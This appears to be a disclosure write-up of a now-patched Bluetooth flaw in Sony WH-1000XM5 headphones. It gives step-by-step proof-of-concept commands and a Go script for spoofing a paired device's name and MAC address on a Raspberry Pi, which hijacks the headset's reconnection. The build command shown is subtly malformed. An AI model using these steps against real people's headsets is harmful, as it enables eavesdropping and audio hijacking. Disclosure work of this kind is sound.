## üîç Overview

Press enter or click to view image in full size

![]()

In 2024, a critical Bluetooth vulnerability was responsibly disclosed in Sony‚Äôs premium noise-cancelling headphones, the **WH-1000XM5**. This flaw allows attackers to impersonate a previously paired device and connect **without any user interaction**. The exploit leverages weaknesses in the device‚Äôs Bluetooth reconnection mechanism, making it vulnerable to **Man-in-the-Middle (MiTM)** attacks, **session hijacking**, and **unauthorized audio access** ‚Äî even when the device is **not in pairing mode**.

The vulnerability has now been patched in firmware update **v2.4.1**, but it highlights a broader issue in how Bluetooth reconnection is handled across many premium headsets.

## üß† Root Cause

The WH-1000XM5 fails to securely implement **Secure Simple Pairing (SSP)** during reconnection. Instead of validating re-authentication keys, the device relies **only on previously cached Bluetooth MAC addresses and device names** to approve a connection.

This means that if an attacker spoofs both the Bluetooth name and address of a previously paired device, the WH-1000XM5 will connect to them **automatically**, assuming it to be a trusted host ‚Äî **even if no prior pairing has occurred with that specific device**.

This is a serious oversight in authentication and deviates from Bluetooth security standards.

## üõ†Ô∏è PoC Setup: Required Devices

To reproduce the vulnerability, you‚Äôll need the following hardware:

Role Device Model Bluetooth Version üéß Victim Device Sony WH-1000XM5 Headphones 5.2 üíª Master Device Surface Laptop 4 / Pixel 7 Pro 5.1 or 5.2 üßë‚Äçüíª Attacker Raspberry Pi 4 Model B 5.0 (BlueZ 5.55)

## üîß Raspberry Pi (Attacker) Configuration

## Step 1: Change Bluetooth Name

```
sudo nano /etc/machine-info
```

Add line:

```
PRETTY_HOSTNAME=Surface Laptop 4
```

Restart Bluetooth:

```
sudo systemctl restart bluetooth
```

## Step 2: Change Bluetooth MAC Address

Install Go if not installed:

```
sudo apt install golang-go
```

Create a script `main.go`:

```
package main
import (
    "flag"
    "os/exec"
)
func main() {
    addr := flag.String("addr", "", "New Bluetooth MAC")
    flag.Parse()
    exec.Command("sudo", "bdaddr", "-i", "hci0", *addr).Run()
}
```

Compile and run it:

```
go build main.go -o chgbtaddr
sudo ./chgbtaddr -addr 00:11:22:33:44:55
```

## Step 3: Set Adapter to Discoverable

```
bluetoothctl
power on
agent on
discoverable on
pairable on
```

## ‚ñ∂Ô∏è Reproduction Steps

Follow these steps in order:

1. Pair WH-1000XM5 with the master device (e.g. Surface Laptop 4)
2. Turn off the master device.
3. Power off WH-1000XM5 (do not hold button >5s to avoid pairing mode).
4. Spoof the Raspberry Pi‚Äôs Bluetooth MAC and name to match the master device.
5. Set Raspberry Pi Bluetooth adapter to **discoverable and pairable**.
6. Power on WH-1000XM5.

‚úÖ Headphones **automatically connect** to Raspberry Pi.
 ‚ùå No pairing process is required.
 ‚ö†Ô∏è No user notification or confirmation is shown.

This demonstrates **unauthorized access to a secure headset** with zero user interaction.

## üìÇ Included Files

* `main.go` ‚Äì Go script to spoof Bluetooth MAC address
* `WH-1000XM5_vuln_poc.pcapng` ‚Äì Packet capture showing unauthorized reconnection

## üî• Real-World Impact

This vulnerability enables:

* üéß **Audio Hijacking** ‚Äî Route media/audio through the attacker‚Äôs device
* üîÅ **Persistent Reconnection** ‚Äî Device will auto-reconnect even after power cycling
* üëÇ **Eavesdropping** ‚Äî Attacker can record or inject fake audio
* üéÆ **Session Takeover** ‚Äî Disrupt legitimate Bluetooth sessions

In corporate or high-security settings, this could lead to serious **privacy breaches**.

## üß™ Affected & Similar Devices

Although this PoC was built around the WH-1000XM5, the researcher noted:

* WH-1000XM4 exhibits similar behavior
* WF-1000XM5 / XM4 may be affected
* At least **three other premium brands** showed similar flaws

Common factor: All these headsets use **high-performance generic Bluetooth chips** with **vendor-specific firmware** layered over them. The vulnerability likely stems from **insecure firmware design**, not the Bluetooth protocol itself.

## üìå Conclusion

This vulnerability is a textbook example of **incomplete implementation of Bluetooth SSP reconnection**. It allows attackers to **spoof trusted devices and bypass authentication**, undermining core Bluetooth trust mechanisms.

Thanks to responsible disclosure, **Sony patched this issue in v2.4.1**, and acknowledged the researcher. However, this case is a wake-up call for manufacturers:

* Implement proper **SSP validation during every reconnection**
* Prevent **auto-pairing based only on MAC and name**
* Notify users of any **reconnection attempts**

The root cause may lie in **generic Bluetooth chip stacks**, indicating a broader infrastructure problem.

## ‚úçÔ∏è Final Thoughts

The researcher responsibly disclosed this vulnerability via HackerOne. Despite no direct bounty, they received **swag, public acknowledgment**, and their findings were presented at **ICSS 2025**. A true example of community-driven security.
